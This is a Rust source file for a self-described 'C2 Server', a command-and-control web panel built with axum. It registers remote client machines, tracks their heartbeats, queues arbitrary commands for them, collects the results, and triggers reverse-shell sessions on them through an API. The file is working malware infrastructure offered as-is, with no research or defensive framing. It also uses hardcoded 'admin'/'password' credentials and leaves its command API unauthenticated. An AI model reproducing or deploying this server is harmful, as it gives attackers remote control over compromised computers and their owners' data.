use askama::Template;
use axum::{
    Json, Router,
    extract::{Path, State, Form, Request},
    http::StatusCode,
    response::{Html, IntoResponse, Response},
    routing::{get, post},
    serve,
    middleware::Next,
};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::net::TcpListener;
use tokio::sync::RwLock;
use tower_http::cors::CorsLayer;
use tower_http::services::ServeDir;
use tower_cookies::{CookieManagerLayer, Cookies, Cookie};
use rand::Rng;

// 引入common模块
use common::*;

/// 服务器状态
#[derive(Clone)]
pub struct ServerState {
    pub clients: Arc<RwLock<HashMap<String, ClientInfo>>>,
    pub commands: Arc<RwLock<HashMap<String, Vec<CommandRequest>>>>,
    pub command_results: Arc<RwLock<HashMap<String, Vec<CommandResponse>>>>,
    pub shell_sessions: Arc<RwLock<HashMap<String, ShellSession>>>,
    pub session_tokens: Arc<RwLock<HashMap<String, chrono::DateTime<chrono::Utc>>>>,
}

impl ServerState {
    pub fn new() -> Self {
        Self {
            clients: Arc::new(RwLock::new(HashMap::new())),
            commands: Arc::new(RwLock::new(HashMap::new())),
            command_results: Arc::new(RwLock::new(HashMap::new())),
            shell_sessions: Arc::new(RwLock::new(HashMap::new())),
            session_tokens: Arc::new(RwLock::new(HashMap::new())),
        }
    }
}

/// 生成32位随机字母数字字符串
fn generate_session_token() -> String {
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut rng = rand::thread_rng();
    
    (0..32)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}

/// Web模板
#[derive(Template)]
#[template(path = "index.html")]
struct IndexTemplate {
    clients: Vec<DisplayClientInfo>,
    online_clients_count: usize,
    os_types_count: usize,
}

// New struct to combine ClientInfo with online status for display
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DisplayClientInfo {
    #[serde(flatten)]
    pub client_info: ClientInfo,
    pub is_online: bool,
}

#[derive(Template)]
#[template(path = "client.html")]
struct ClientTemplate {
    client: ClientInfo,
    commands: Vec<CommandResponse>,
}

#[derive(Template)]
#[template(path = "login.html")]
struct LoginTemplate {}

#[derive(Debug, Deserialize)]
struct Credentials {
    username: String,
    password: String,
}

/// API处理器
/// 客户端注册
async fn register_client(
    State(state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        let mut clients = state.clients.write().await;
        clients.insert(client_info.id.clone(), client_info);
        println!("Client registered: {}", clients.len());
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 心跳处理
async fn handle_heartbeat(
    State(state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(mut client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        client_info.last_seen = chrono::Utc::now();
        let mut clients = state.clients.write().await;
        clients.insert(client_info.id.clone(), client_info);
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 获取客户端命令
async fn get_commands(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Result<Json<Vec<CommandRequest>>, StatusCode> {
    let mut commands = state.commands.write().await;
    let client_commands = commands.remove(&client_id).unwrap_or_default();
    Ok(Json(client_commands))
}

/// 接收命令结果
async fn handle_command_result(
    State(state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
        let mut results = state.command_results.write().await;
        results
            .entry(result.client_id.clone())
            .or_insert_with(Vec::new)
            .push(result);
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 处理Shell数据
async fn handle_shell_data(
    State(_state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(shell_data) = serde_json::from_slice::<ShellData>(&message.payload) {
        // 这里可以实现Shell数据的处理和转发
        println!("Received shell data from {}: {} bytes", 
                shell_data.session_id, shell_data.data.len());
        
        // 可以在这里添加实时转发给Web界面的逻辑
        // 比如通过WebSocket发送给前端
        
        Ok(StatusCode::OK)
    } else {
        println!("Received shell data: {} bytes", message.payload.len());
        Ok(StatusCode::OK)
    }
}

/// Web界面处理器
/// 主页面
async fn index(State(state): State<ServerState>) -> Result<Html<String>, StatusCode> {
    let clients = state.clients.read().await;
    let current_timestamp = chrono::Utc::now().timestamp();

    let display_clients: Vec<DisplayClientInfo> = clients
        .values()
        .cloned()
        .map(|c| {
            let is_online = (current_timestamp - c.last_seen.timestamp()) < 60;
            DisplayClientInfo {
                client_info: c,
                is_online,
            }
        })
        .collect();

    let online_clients_count = display_clients.iter().filter(|c| c.is_online).count();
    let os_types_count = display_clients
        .iter()
        .map(|c| c.client_info.os.as_str())
        .collect::<std::collections::HashSet<_>>()
        .len();

    let template = IndexTemplate {
        clients: display_clients,
        online_clients_count,
        os_types_count,
    };

    match template.render() {
        Ok(html) => Ok(Html(html)),
        Err(e) => {
            eprintln!("Template rendering error: {e:?}");
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// 客户端详情页面
async fn client_detail(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Result<Html<String>, StatusCode> {
    let clients = state.clients.read().await;
    let command_results = state.command_results.read().await;

    if let Some(client) = clients.get(&client_id) {
        let commands = command_results.get(&client_id).cloned().unwrap_or_default();

        let template = ClientTemplate {
            client: client.clone(),
            commands,
        };

        match template.render() {
            Ok(html) => Ok(Html(html)),
            Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
        }
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

/// 发送命令到客户端
async fn send_command(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
    Json(mut cmd): Json<CommandRequest>,
) -> Result<StatusCode, StatusCode> {
    cmd.client_id = client_id.clone();

    let mut commands = state.commands.write().await;
    commands.entry(client_id).or_insert_with(Vec::new).push(cmd);

    Ok(StatusCode::OK)
}

/// 获取客户端列表API
async fn api_clients(State(state): State<ServerState>) -> Json<Vec<ClientInfo>> {
    let clients = state.clients.read().await;
    let clients_vec: Vec<ClientInfo> = clients.values().cloned().collect();
    Json(clients_vec)
}

/// 获取命令结果API
async fn api_command_results(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Json<Vec<CommandResponse>> {
    let command_results = state.command_results.read().await;
    let results = command_results.get(&client_id).cloned().unwrap_or_default();
    Json(results)
}

/// 启动反弹Shell
async fn initiate_reverse_shell(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    // 创建反弹Shell会话
    let session_id = uuid::Uuid::new_v4().to_string();
    let shell_session = ShellSession {
        client_id: client_id.clone(),
        session_id: session_id.clone(),
        created_at: chrono::Utc::now(),
        is_active: true,
    };

    // 保存Shell会话
    {
        let mut sessions = state.shell_sessions.write().await;
        sessions.insert(session_id.clone(), shell_session);
    }

    // 发送反弹Shell命令到客户端
    let command = CommandRequest {
        client_id: client_id.clone(),
        command: "REVERSE_SHELL".to_string(),
        args: vec![session_id],
    };

    let mut commands = state.commands.write().await;
    commands
        .entry(client_id)
        .or_insert_with(Vec::new)
        .push(command);

    Ok(StatusCode::OK)
}

async fn login_get() -> Html<String> {
    let template = LoginTemplate {};
    Html(template.render().unwrap())
}

// FIXED: Correct parameter order for axum 0.8.4
async fn login_post(
    State(state): State<ServerState>,
    cookies: Cookies,
    Form(credentials): Form<Credentials>,
) -> impl IntoResponse {
    const USERNAME: &str = "admin";
    const PASSWORD: &str = "password";

    if credentials.username == USERNAME && credentials.password == PASSWORD {
        // 生成32位随机session token
        let session_token = generate_session_token();
        let expires_at = chrono::Utc::now() + chrono::Duration::hours(24); // 24小时有效期
        
        // 存储session token
        {
            let mut tokens = state.session_tokens.write().await;
            tokens.insert(session_token.clone(), expires_at);
        }
        
        // 设置cookie
        let mut cookie = Cookie::new("session_token", session_token);
        cookie.set_max_age(Some(tower_cookies::cookie::time::Duration::hours(24)));
        cookie.set_http_only(true);
        cookie.set_secure(false); // 在生产环境中应该设置为true
        cookie.set_same_site(tower_cookies::cookie::SameSite::Lax);
        
        cookies.add(cookie);
        axum::response::Redirect::to("/").into_response()
    } else {
        axum::response::Redirect::to("/login").into_response()
    }
}

// FIXED: Correct parameter order for middleware in axum 0.8.4
async fn auth_middleware(
    State(state): State<ServerState>,
    cookies: Cookies,
    request: Request,
    next: Next,
) -> Response {
    if let Some(cookie) = cookies.get("session_token") {
        let token = cookie.value();
        let mut tokens = state.session_tokens.write().await;
        
        if let Some(expires_at) = tokens.get(token) {
            if chrono::Utc::now() < *expires_at {
                // Token有效，继续处理请求
                return next.run(request).await;
            } else {
                // Token过期，删除它
                tokens.remove(token);
            }
        }
    }
    
    axum::response::Redirect::to("/login").into_response()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let state = ServerState::new();

    // Routes that require authentication
    let protected_routes = Router::new()
        .route("/", get(index))
        .route("/client/{id}", get(client_detail))
        .route_layer(axum::middleware::from_fn_with_state(
            state.clone(),
            auth_middleware,
        ));

    // API routes (unprotected or with their own auth)
    let api_routes = Router::new()
        .route("/api/register", post(register_client))
        .route("/api/heartbeat", post(handle_heartbeat))
        .route("/api/commands/{client_id}", get(get_commands))
        .route("/api/command_result", post(handle_command_result))
        .route("/api/shell_data", post(handle_shell_data))
        .route("/api/clients", get(api_clients))
        .route("/api/clients/{client_id}/commands", post(send_command))
        .route("/api/clients/{client_id}/results", get(api_command_results))
        .route("/api/clients/{client_id}/reverse_shell", post(initiate_reverse_shell));

    // Main application router
    let app = Router::new()
        .route("/login", get(login_get).post(login_post))
        .merge(protected_routes)
        .merge(api_routes)
        // Static files
        .nest_service("/static", ServeDir::new("web/static"))
        .layer(CorsLayer::permissive())
        .layer(CookieManagerLayer::new())
        .with_state(state);

    println!("C2 Server starting on http://0.0.0.0:8080");

    let listener = TcpListener::bind("0.0.0.0:8080").await?;
    
    serve(listener, app).await?;

    Ok(())
}
